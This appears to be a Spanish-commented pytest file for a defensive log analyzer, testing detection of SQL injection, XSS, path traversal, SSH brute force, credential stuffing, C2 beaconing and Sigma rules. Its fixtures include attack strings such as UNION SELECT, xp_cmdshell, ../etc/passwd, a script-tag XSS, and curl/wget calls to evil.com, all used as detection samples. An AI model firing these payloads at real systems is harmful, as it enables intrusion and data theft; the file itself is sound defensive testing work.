# © VampSecure Studios — VampSecure Labs Security Research Division
"""
test_unit.py — Tests unitarios para vamp-log-analyzer.

Cubre: regexes de detección, parseo de logs, lógica del Detector (FORA-001,
FORA-022, FORA-023, FORA-024, FORA-019), reconocimiento de tipo de log,
y formato del bundle STIX.
Mínimo 12 tests unitarios independientes.
"""

import sys
import datetime
import statistics
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from vamp_log_analyzer import (
    Detector,
    LogEvent,
    RE_SQLI,
    RE_XSS,
    RE_TRAVERSAL,
    RE_WEBSHELL,
    RE_SENSITIVE_FILES,
    RE_SCANNER_UA,
    FINDING_PREFIX,
    detect_log_type,
    parse_apache,
    _parse_auth_ts,
    MITRE_MAPPING,
)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers reutilizados en varios tests
# ─────────────────────────────────────────────────────────────────────────────

def _evento_ssh_fail(ip: str, offset_sec: int = 0) -> LogEvent:
    """Crea evento de fallo SSH con IP y offset temporal dados."""
    base = datetime.datetime(2026, 10, 1, 10, 0, 0)
    return LogEvent(
        timestamp=base + datetime.timedelta(seconds=offset_sec),
        source_file="auth.log",
        source_line=1,
        log_type="linux_auth",
        raw=f"Failed password for root from {ip} port 22 ssh2",
        ip=ip,
        user="root",
        action="SSH_FAIL",
    )


def _evento_web(ip: str, path: str, status: int,
                ua: str = "Mozilla/5.0",
                bytes_out: int = 512,
                offset_sec: int = 0) -> LogEvent:
    """Crea evento web con los campos dados."""
    base = datetime.datetime(2026, 10, 1, 10, 0, 0)
    return LogEvent(
        timestamp=base + datetime.timedelta(seconds=offset_sec),
        source_file="access.log",
        source_line=1,
        log_type="web",
        raw=f'10.0.0.1 - - "GET {path} HTTP/1.1" {status} {bytes_out}',
        ip=ip,
        user=None,
        action="GET",
        resource=path,
        status=status,
        bytes_out=bytes_out,
        user_agent=ua,
    )


# ─────────────────────────────────────────────────────────────────────────────
# 1. Regex RE_SQLI — SQL injection
# ─────────────────────────────────────────────────────────────────────────────

class TestRegexSQLi:
    """Verifica que el regex de SQLi detecta los patrones correctos."""

    def test_union_select_detectado(self):
        assert RE_SQLI.search("/q=1 union select user,pass from accounts") is not None

    def test_select_from_where_detectado(self):
        assert RE_SQLI.search("/data?x=SELECT * FROM tabla WHERE 1=1") is not None

    def test_xp_cmdshell_detectado(self):
        assert RE_SQLI.search("/exec?q=xp_cmdshell('dir')") is not None

    def test_ruta_limpia_no_detectada(self):
        assert RE_SQLI.search("/productos/lista?cat=electrónica") is None


# ─────────────────────────────────────────────────────────────────────────────
# 2. Regex RE_TRAVERSAL — path traversal y LFI
# ─────────────────────────────────────────────────────────────────────────────

class TestRegexTraversal:
    """Verifica detección de path traversal en URLs."""

    def test_punto_punto_slash_detectado(self):
        assert RE_TRAVERSAL.search("/../etc/passwd") is not None

    def test_etc_passwd_directo(self):
        assert RE_TRAVERSAL.search("/var/etc/passwd") is not None

    def test_php_stream_detectado(self):
        assert RE_TRAVERSAL.search("php://input") is not None

    def test_ruta_normal_no_detectada(self):
        assert RE_TRAVERSAL.search("/assets/img/logo.png") is None


# ─────────────────────────────────────────────────────────────────────────────
# 3. Detector FORA-001 — fuerza bruta SSH
# ─────────────────────────────────────────────────────────────────────────────

class TestDetectorFORA001:
    """Verifica la detección de fuerza bruta SSH (FORA-001)."""

    def test_brute_ssh_supera_umbral(self, detector_umbral_bajo):
        """FORA-001 se emite cuando se supera el umbral en la ventana."""
        ip = "172.16.0.99"
        # Umbral = 3, enviar 4 fallos
        for i in range(4):
            detector_umbral_bajo.process(_evento_ssh_fail(ip, offset_sec=i))
        findings = detector_umbral_bajo.finalize()
        fora001 = [f for f in findings if "001" in f.fid]
        assert len(fora001) > 0

    def test_brute_ssh_no_supera_umbral(self, detector_umbral_bajo):
        """Con 2 fallos (umbral = 3) no se emite FORA-001."""
        for i in range(2):
            detector_umbral_bajo.process(_evento_ssh_fail("10.0.0.1", offset_sec=i))
        findings = detector_umbral_bajo.finalize()
        fora001 = [f for f in findings if "001" in f.fid]
        assert len(fora001) == 0

    def test_brute_ssh_ip_en_hallazgo(self, detector_umbral_bajo):
        """La IP atacante aparece en el hallazgo FORA-001."""
        ip = "192.168.1.200"
        for i in range(4):
            detector_umbral_bajo.process(_evento_ssh_fail(ip, offset_sec=i))
        findings = detector_umbral_bajo.finalize()
        fora001 = [f for f in findings if "001" in f.fid]
        assert ip in fora001[0].ips


# ─────────────────────────────────────────────────────────────────────────────
# 4. Detector FORA-019 — acceso a ficheros sensibles (200 real vs 404)
# ─────────────────────────────────────────────────────────────────────────────

class TestDetectorFORA019:
    """Verifica la distinción entre 200 real (crítico) y 404 (ruido)."""

    def test_sensible_200_genera_critical(self, detector_defecto):
        """Acceso a /.env con status 200 genera FORA-019 CRITICAL."""
        evento = _evento_web("10.0.0.1", "/.env", 200,
                             bytes_out=128, offset_sec=0)
        findings_list = detector_defecto.analyze_event(evento)
        fora019 = [f for f in findings_list if "019" in f.fid]
        assert len(fora019) > 0
        assert fora019[0].severity == "CRITICAL"

    def test_sensible_404_no_genera_critical(self, detector_defecto):
        """Acceso a /.env con status 404 no genera FORA-019 CRITICAL."""
        evento = _evento_web("10.0.0.1", "/.env", 404,
                             bytes_out=0, offset_sec=0)
        findings_list = detector_defecto.analyze_event(evento)
        fora019_critical = [
            f for f in findings_list
            if "019" in f.fid and f.severity == "CRITICAL"
        ]
        assert len(fora019_critical) == 0


# ─────────────────────────────────────────────────────────────────────────────
# 5. Detector FORA-022 — credential stuffing
# ─────────────────────────────────────────────────────────────────────────────

class TestDetectorFORA022:
    """Verifica la detección de credential stuffing (FORA-022)."""

    def test_credential_stuffing_muchas_ips_mismo_usuario(self, detector_defecto):
        """
        5 IPs distintas con 1 fallo cada una para el mismo usuario,
        seguido de un éxito desde una 6ª IP distinta, debe producir FORA-022.
        """
        base = datetime.datetime(2026, 10, 1, 10, 0, 0)
        for i in range(5):
            evento = LogEvent(
                timestamp=base + datetime.timedelta(seconds=i),
                source_file="auth.log",
                source_line=i,
                log_type="linux_auth",
                raw=f"Failed password for admin from 10.0.{i}.1 port 22",
                ip=f"10.0.{i}.1",
                user="admin",
                action="SSH_FAIL",
            )
            detector_defecto.process(evento)
        # Login exitoso desde una IP distinta completa el patrón credential stuffing
        evento_ok = LogEvent(
            timestamp=base + datetime.timedelta(seconds=10),
            source_file="auth.log",
            source_line=5,
            log_type="linux_auth",
            raw="Accepted password for admin from 10.0.5.1 port 22",
            ip="10.0.5.1",
            user="admin",
            action="SSH_OK",
        )
        detector_defecto.process(evento_ok)
        findings = detector_defecto.finalize()
        fora022 = [f for f in findings if "022" in f.fid]
        assert len(fora022) > 0


# ─────────────────────────────────────────────────────────────────────────────
# 6. Detector FORA-023 — baliza C2 (CoV < 0.20)
# ─────────────────────────────────────────────────────────────────────────────

class TestDetectorFORA023:
    """Verifica la detección de balizas C2 con intervalos regulares."""

    def test_beacon_cov_bajo_genera_fora023(self, detector_defecto):
        """
        8 peticiones con intervalo exactamente regular (CoV~0) a una ruta
        externa deben generar FORA-023 HIGH.
        """
        base = datetime.datetime(2026, 10, 1, 10, 0, 0)
        ip = "1.2.3.4"  # IP pública, no privada
        ruta = "/c2/beacon"
        # Intervalos de exactamente 30s → CoV = 0
        for i in range(8):
            evento = LogEvent(
                timestamp=base + datetime.timedelta(seconds=i * 30),
                source_file="access.log",
                source_line=i,
                log_type="web",
                raw=f"GET {ruta} 200",
                ip=ip,
                action="GET",
                resource=ruta,
                status=200,
                bytes_out=256,
            )
            detector_defecto.process(evento)
        findings = detector_defecto.finalize()
        fora023 = [f for f in findings if "023" in f.fid]
        assert len(fora023) > 0, "No se detectó baliza C2 con CoV=0"
        assert fora023[0].severity == "HIGH"

    def test_cov_calculo_correcto(self):
        """Verificación matemática de CoV < 0.20 para intervalos regulares."""
        intervalos = [30.0] * 7  # intervalos perfectamente uniformes
        media = sum(intervalos) / len(intervalos)
        desv = statistics.stdev(intervalos)
        cov = desv / media if media > 0 else 1.0
        assert cov < 0.20, f"CoV calculado ({cov:.3f}) no es < 0.20"


# ─────────────────────────────────────────────────────────────────────────────
# 7. Detector FORA-024 — slow drip brute force
# ─────────────────────────────────────────────────────────────────────────────

class TestDetectorFORA024:
    """Verifica la detección de fuerza bruta lenta distribuida en el tiempo."""

    def test_slow_drip_distribuido_en_mas_de_1h(self):
        """
        12 fallos SSH distribuidos en 2 horas generan FORA-024 (slow drip).
        La cadencia es inferior al umbral de brute force normal.
        """
        # Umbral SSH = 9: FORA-001 exige 9 fallos en 60s (imposible a 1 fallo/10min),
        # y FORA-024 exige max(10, 9+1)=10 eventos → 12 eventos disparan FORA-024.
        config = {
            "brute_threshold_ssh": 9,
            "brute_threshold_web": 100,
            "dir_enum_threshold": 100,
            "brute_window_sec": 60,
            "unusual_hours": (2, 6),
            "exfil_bytes_threshold": 50_000_000,
            "slow_query_ms": 5000,
            "max_events_per_finding": 50,
            "spray_users_min": 5,
            "large_response": 10 * 1024 * 1024,
        }
        detector = Detector(config)
        base = datetime.datetime(2026, 10, 1, 10, 0, 0)
        ip = "10.0.0.77"
        for i in range(12):
            # Un fallo cada 10 minutos → 2 horas de duración
            evento = LogEvent(
                timestamp=base + datetime.timedelta(minutes=i * 10),
                source_file="auth.log",
                source_line=i,
                log_type="linux_auth",
                raw=f"Failed password for admin from {ip} port 22",
                ip=ip,
                user="admin",
                action="SSH_FAIL",
            )
            detector.process(evento)
        findings = detector.finalize()
        fora024 = [f for f in findings if "024" in f.fid]
        assert len(fora024) > 0, "No se detectó fuerza bruta lenta (slow drip)"


# ─────────────────────────────────────────────────────────────────────────────
# 8. Parseo de línea Apache con parse_apache
# ─────────────────────────────────────────────────────────────────────────────

class TestParseApache:
    """Verifica el parser Apache/nginx (Combined Log Format)."""

    def test_parsea_linea_valida(self, tmp_path):
        """Una línea CLF válida produce un LogEvent con todos los campos."""
        contenido = (
            '10.0.0.1 - admin [01/Oct/2026:10:00:00 +0000] '
            '"GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"\n'
        )
        ruta = tmp_path / "access.log"
        ruta.write_text(contenido, encoding="utf-8")
        eventos = list(parse_apache(str(ruta)))
        assert len(eventos) == 1
        evento = eventos[0]
        assert evento.ip == "10.0.0.1"
        assert evento.user == "admin"
        assert evento.status == 200
        assert evento.bytes_out == 1024
        assert evento.action == "GET"

    def test_linea_invalida_no_produce_evento(self, tmp_path):
        """Una línea de syslog no produce eventos desde parse_apache."""
        contenido = "Oct  1 10:00:00 srv sshd[1]: Failed password for root\n"
        ruta = tmp_path / "auth.log"
        ruta.write_text(contenido, encoding="utf-8")
        eventos = list(parse_apache(str(ruta)))
        assert len(eventos) == 0


# ─────────────────────────────────────────────────────────────────────────────
# 9. Detección automática de tipo de log
# ─────────────────────────────────────────────────────────────────────────────

class TestDetectLogType:
    """Verifica detect_log_type con contenido de distintas fuentes."""

    def test_detecta_web_desde_combined_log(self, tmp_path):
        """Línea CLF → tipo 'web'."""
        contenido = (
            '10.0.0.1 - - [01/Oct/2026:10:00:00 +0000] '
            '"GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0"\n'
        )
        ruta = tmp_path / "access.log"
        ruta.write_text(contenido, encoding="utf-8")
        assert detect_log_type(str(ruta)) == "web"

    def test_detecta_linux_auth(self, tmp_path):
        """Línea con sshd[ → tipo 'linux_auth'."""
        contenido = (
            "Oct  1 10:00:00 srv sshd[1234]: Failed password for root from 10.0.0.1\n"
        )
        ruta = tmp_path / "auth.log"
        ruta.write_text(contenido, encoding="utf-8")
        assert detect_log_type(str(ruta)) == "linux_auth"


# ─────────────────────────────────────────────────────────────────────────────
# 10. Mapeado MITRE ATT&CK
# ─────────────────────────────────────────────────────────────────────────────

class TestMitreMappig:
    """Verifica que los FORA relevantes tienen mapeado MITRE."""

    def test_fora_001_tiene_tactica_mitre(self):
        assert "FORA-001" in MITRE_MAPPING
        assert "tactic" in MITRE_MAPPING["FORA-001"]

    def test_fora_023_es_c2(self):
        assert "FORA-023" in MITRE_MAPPING
        assert "C2" in MITRE_MAPPING["FORA-023"]["technique"] or \
               "C2" in MITRE_MAPPING["FORA-023"]["tactic"] or \
               "Control" in MITRE_MAPPING["FORA-023"]["tactic"]


# ─────────────────────────────────────────────────────────────────────────────
# 11. Reconstrucción de sesión — ventana temporal
# ─────────────────────────────────────────────────────────────────────────────

class TestReconstruccionSesion:
    """Verifica la agrupación de eventos por IP en ventana temporal."""

    def test_eventos_misma_ip_agrupados(self, detector_defecto):
        """Varios eventos de la misma IP se almacenan juntos."""
        ip = "10.1.2.3"
        base = datetime.datetime(2026, 10, 1, 10, 0, 0)
        for i in range(5):
            e = _evento_web(ip, f"/page{i}", 200, offset_sec=i * 60)
            detector_defecto.process(e)
        por_ip = detector_defecto.get_ip_events()
        assert ip in por_ip
        assert len(por_ip[ip]) == 5


# ─────────────────────────────────────────────────────────────────────────────
# 12. Parseo de timestamps auth.log (BSD y ISO)
# ─────────────────────────────────────────────────────────────────────────────

class TestParseoTimestampAuth:
    """Verifica el parseo de timestamps en auth.log (BSD y ISO 8601)."""

    def test_bsd_timestamp_parseable(self):
        """Formato BSD 'Oct  1 10:00:00' es parseado correctamente."""
        ts = _parse_auth_ts("Oct  1 10:00:00 srv sshd[1]: message")
        assert ts is not None
        assert ts.month == 10
        assert ts.day == 1

    def test_iso_timestamp_parseable(self):
        """Formato ISO '2026-10-01T10:00:00' es parseado correctamente."""
        ts = _parse_auth_ts("2026-10-01T10:00:00 srv sshd[1]: message")
        assert ts is not None
        assert ts.year == 2026

    def test_linea_sin_timestamp_devuelve_none(self):
        """Una línea sin timestamp devuelve None."""
        ts = _parse_auth_ts("Esta línea no tiene timestamp")
        assert ts is None


# ─────────────────────────────────────────────────────────────────────────────
# 13. Severidad de hallazgos — ordenación correcta
# ─────────────────────────────────────────────────────────────────────────────

class TestSeveridadHallazgos:
    """Verifica que los hallazgos tienen severidades correctas."""

    def test_inyeccion_sql_es_critical(self, detector_defecto):
        """SQL injection en petición web genera hallazgo CRITICAL."""
        evento = _evento_web(
            "10.0.0.1",
            "/q=1 UNION SELECT pass FROM users",
            200,
        )
        findings = detector_defecto.analyze_event(evento)
        sqli = [f for f in findings if "004" in f.fid or "sqli" in f.title.lower()]
        assert len(sqli) > 0
        assert sqli[0].severity == "CRITICAL"

    def test_xss_es_high(self, detector_defecto):
        """XSS en URL genera hallazgo HIGH."""
        evento = _evento_web(
            "10.0.0.1",
            "/comment?t=<script>alert(1)</script>",
            200,
        )
        findings = detector_defecto.analyze_event(evento)
        xss = [f for f in findings if "006" in f.fid or "xss" in f.title.lower()]
        assert len(xss) > 0
        assert xss[0].severity == "HIGH"


# ─────────────────────────────────────────────────────────────────────────────
# 14. Motor Sigma — SigmaLoader + SigmaEngine
# ─────────────────────────────────────────────────────────────────────────────

import tempfile, os, datetime as _dt, dataclasses

from vamp_log_analyzer import (
    SigmaRule, SigmaLoader, apply_sigma_rules,
    _rule_matches_event, _eval_sigma_condition,
    _sigma_level_to_severity, LogEvent,
)


def _make_event(**kwargs):
    defaults = dict(
        timestamp=_dt.datetime(2026, 10, 5, 12, 0, 0),
        source_file="test.log",
        source_line=1,
        log_type="generic",
        raw="",
        ip=None, user=None, action=None, resource=None,
        status=None, bytes_out=None, user_agent=None, extra={},
    )
    defaults.update(kwargs)
    return LogEvent(**defaults)


def _make_rule(**kwargs):
    defaults = dict(
        title="Test Rule", rule_id="aabb1122",
        status="test", description="",
        level="high", tags=[], logsource={},
        detection={"selection": {"action|contains": "powershell"}, "condition": "selection"},
        falsepositives=[], path="/tmp/test.yml",
    )
    defaults.update(kwargs)
    return SigmaRule(**defaults)


class TestSigmaLoader:
    """Prueba carga de reglas desde YAML."""

    def test_carga_fichero_valido(self, tmp_path):
        rule_content = """
title: Suspicious PowerShell
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detecta PowerShell sospechoso
level: high
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: powershell
    condition: selection
falsepositives:
    - Administración legítima
"""
        p = tmp_path / "test_rule.yml"
        p.write_text(rule_content, encoding="utf-8")
        rules = SigmaLoader.load(str(p))
        assert len(rules) == 1
        assert rules[0].title == "Suspicious PowerShell"
        assert rules[0].level == "high"

    def test_ignora_yaml_sin_detection(self, tmp_path):
        p = tmp_path / "bad.yml"
        p.write_text("title: Sin detection\n", encoding="utf-8")
        rules = SigmaLoader.load(str(p))
        assert len(rules) == 0

    def test_carga_directorio_recursivo(self, tmp_path):
        sub = tmp_path / "subdir"
        sub.mkdir()
        rule = "title: Rule1\nid: aaa\nstatus: test\ndetection:\n  selection:\n    action: x\n  condition: selection\nlevel: low\n"
        (tmp_path / "rule1.yml").write_text(rule, encoding="utf-8")
        (sub / "rule2.yaml").write_text(rule.replace("Rule1", "Rule2").replace("aaa", "bbb"), encoding="utf-8")
        rules = SigmaLoader.load(str(tmp_path))
        assert len(rules) == 2

    def test_fichero_inexistente_devuelve_lista_vacia(self, tmp_path):
        rules = SigmaLoader.load(str(tmp_path / "no_existe.yml"))
        assert rules == []


class TestSigmaMatch:
    """Prueba coincidencia de reglas con eventos."""

    def test_contains_coincide(self):
        rule = _make_rule(
            detection={"selection": {"action|contains": "powershell"}, "condition": "selection"},
        )
        evento = _make_event(action="C:\\Windows\\System32\\powershell.exe -enc abc")
        assert _rule_matches_event(rule, evento)

    def test_contains_no_coincide(self):
        rule = _make_rule(
            detection={"selection": {"action|contains": "powershell"}, "condition": "selection"},
        )
        evento = _make_event(action="cmd.exe /c whoami")
        assert not _rule_matches_event(rule, evento)

    def test_startswith_coincide(self):
        rule = _make_rule(
            detection={"sel": {"resource|startswith": "/admin"}, "condition": "sel"},
        )
        evento = _make_event(resource="/admin/panel", log_type="web")
        assert _rule_matches_event(rule, evento)

    def test_multivalor_or(self):
        rule = _make_rule(
            detection={
                "sel": {"action|contains": ["wget", "curl", "nc"]},
                "condition": "sel",
            },
        )
        assert _rule_matches_event(rule, _make_event(action="curl -s http://evil.com"))
        assert _rule_matches_event(rule, _make_event(action="wget http://evil.com"))
        assert not _rule_matches_event(rule, _make_event(action="ls -la"))

    def test_regex_coincide(self):
        rule = _make_rule(
            detection={"sel": {"raw|re": r"\bSELECT\s+\*\s+FROM\b"}, "condition": "sel"},
        )
        evento = _make_event(raw="GET /q?sql=SELECT * FROM users HTTP/1.1")
        assert _rule_matches_event(rule, evento)

    def test_logsource_filtra_tipo(self):
        rule = _make_rule(
            logsource={"product": "windows"},
            detection={"sel": {"action|contains": "cmd"}, "condition": "sel"},
        )
        evento_win = _make_event(action="cmd.exe", log_type="windows")
        evento_web = _make_event(action="cmd", log_type="web")
        assert _rule_matches_event(rule, evento_win)
        assert not _rule_matches_event(rule, evento_web)


class TestSigmaCondition:
    """Prueba evaluación de condiciones complejas."""

    def test_and_condition(self):
        results = {"sel1": True, "sel2": True}
        assert _eval_sigma_condition("sel1 and sel2", results)
        results["sel2"] = False
        assert not _eval_sigma_condition("sel1 and sel2", results)

    def test_or_condition(self):
        results = {"sel1": False, "sel2": True}
        assert _eval_sigma_condition("sel1 or sel2", results)

    def test_not_condition(self):
        results = {"sel1": True}
        assert not _eval_sigma_condition("not sel1", results)

    def test_1_of_wildcard(self):
        results = {"selection1": True, "selection2": False, "filter": True}
        assert _eval_sigma_condition("1 of selection*", results)

    def test_all_of_them(self):
        results = {"sel1": True, "sel2": True}
        assert _eval_sigma_condition("all of them", results)
        results["sel2"] = False
        assert not _eval_sigma_condition("all of them", results)


class TestSigmaFindings:
    """Prueba generación de Finding desde reglas Sigma."""

    def test_apply_genera_finding(self):
        rule = _make_rule(level="critical")
        evento = _make_event(action="run powershell.exe", ip="1.2.3.4", user="admin")
        findings = apply_sigma_rules([rule], evento)
        assert len(findings) == 1
        assert findings[0].severity == "CRITICAL"
        assert findings[0].title.startswith("[Sigma]")
        assert "1.2.3.4" in findings[0].ips
        assert "admin" in findings[0].users

    def test_nivel_a_severidad(self):
        assert _sigma_level_to_severity("informational") == "INFO"
        assert _sigma_level_to_severity("low") == "LOW"
        assert _sigma_level_to_severity("medium") == "MEDIUM"
        assert _sigma_level_to_severity("high") == "HIGH"
        assert _sigma_level_to_severity("critical") == "CRITICAL"
        assert _sigma_level_to_severity("unknown") == "MEDIUM"

    def test_sin_reglas_no_genera_findings(self):
        evento = _make_event(action="powershell.exe")
        assert apply_sigma_rules([], evento) == []
